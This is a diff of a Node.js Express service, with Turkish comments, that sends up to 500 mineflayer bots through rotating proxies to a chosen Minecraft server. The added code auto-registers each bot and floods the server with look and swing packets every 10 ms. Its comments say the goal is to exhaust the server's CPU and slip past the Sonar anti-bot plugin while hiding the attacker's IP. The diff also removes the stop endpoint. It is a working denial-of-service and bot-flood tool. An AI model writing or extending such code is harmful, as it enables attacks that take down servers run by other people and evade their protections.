@@ -5,12 +5,11 @@ const app = express();
 app.use(express.json());
 app.use(require('cors')());
 
-// 🛡️ VIP PROXY HAVUZU (Burayı çalışan güncel proxylerle doldur kanka)
+// 🛡️ VIP PROXY LİSTESİ (Gerçek IP Gizliliği)
 const proxyList = [
-    "socks5://ip:port", 
-    "socks4://ip:port",
+    "socks5://ip:port",
     "http://ip:port"
-    // Ne kadar çok proxy, o kadar gizli kimlik!
+    // Burayı doldurmayı unutma kanka!
 ];
 
 let activeBots = [];
@@ -20,59 +19,57 @@ app.post('/deploy', (req, res) => {
     const host = ip.includes(':') ? ip.split(':')[0] : ip;
     const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;
 
-    console.log(`[STEALTH MODE] Hedef: ${host}:${port} | 129GB RAM Ayrıldı.`);
+    console.log(`[VIP ELITE] Hedef: ${host} | Paket Kapasitesi: 50.000`);
 
     for (let i = 0; i < Math.min(count, 500); i++) {
-        // ⏱️ HER 2 SANİYEDE BİR GİRİŞ (i * 2000ms)
         setTimeout(() => {
             const currentProxy = proxyList[i % proxyList.length];
-            
-            // Eğer proxy listesi boşsa hata vermemesi için kontrol
-            if (!currentProxy) {
-                console.log("!!! PROXY LISTESI BOS, IP ACIGA CIKABILIR !!!");
-                return;
-            }
+            if (!currentProxy) return;
 
             const agent = new ProxyAgent(currentProxy);
 
             const bot = mineflayer.createBot({
                 host: host,
                 port: port,
-                username: `Trgr_Vip_${Math.floor(Math.random() * 89999) + 10000}`,
+                username: `Trgr_Vip_${Math.floor(Math.random() * 90000) + 10000}`,
                 version: false,
-                agent: agent, // IP KALKANI AKTİF
-                hideErrors: true,
-                connectTimeout: 60000
+                agent: agent,
+                hideErrors: true
             });
 
-            bot.on('login', () => {
-                console.log(`[SECURE] ${bot.username} sızdı. (IP: ${currentProxy})`);
-            });
-
+            // 🛡️ SONAR / ANTI-CHEAT BYPASS
             bot.on('spawn', () => {
-                // Sunucuyu yormak için hafif ama sürekli paket gönderimi
-                setInterval(() => {
-                    if(bot.entity) {
-                        bot.look(Math.random() * 360, 0);
-                        bot.swingArm('right');
+                console.log(`[+] ${bot.username} Sızdı.`);
+                
+                // 1. GİRİŞ VE KAYIT SİSTEMİ
+                setTimeout(() => {
+                    // Sunucu mesajlarını dinleyip /login mi /register mı gerektiğini anlar
+                    bot.chat(`/register resul3163 resul3163`);
+                    bot.chat(`/login resul3163`);
+                }, 2000);
+
+                // 2. 50.000 PAKET STRESS TESTİ (CPU Yorma)
+                // Sonar gibi eklentilerin hareket hızından banlamaması için 
+                // paketleri "Position" değil, "HeadLook" ve "Swing" üzerinden yollarız.
+                let packetCount = 0;
+                const stressInterval = setInterval(() => {
+                    if (packetCount >= 50000 || !bot.entity) {
+                        clearInterval(stressInterval);
+                        return;
                     }
-                }, 100);
+                    
+                    // Sunucuyu meşgul eden sessiz paketler
+                    bot.look(Math.random() * 360, Math.random() * 90);
+                    bot.swingArm('right');
+                    packetCount += 2; // Her döngüde 2 paket
+                }, 10); // Milisaniyelik saldırı
             });
 
-            bot.on('error', (err) => {
-                console.log(`[!] Hata (Proxy kaynaklı olabilir): ${err.message}`);
-            });
-
+            bot.on('error', (err) => console.log(`[!] Hata: ${err.message}`));
             activeBots.push(bot);
-        }, i * 2000); // 👈 İSTEDİĞİN 2 SANİYE GECİKME BURADA
+        }, i * 2000); // 2 saniye kuralı (Sonar Bypass)
     }
-    res.json({ success: true, message: "Hayalet Ordu 2 saniye aralıklarla sızmaya başladı!" });
-});
-
-app.post('/stop', (req, res) => {
-    activeBots.forEach(b => b.quit());
-    activeBots = [];
-    res.json({ success: true, message: "Tüm bağlantılar güvenli şekilde kesildi." });
+    res.json({ success: true, message: "50.000 Paket Kapasiteli Ordu Sevk Edildi!" });
 });
 
 app.listen(process.env.PORT || 3000);
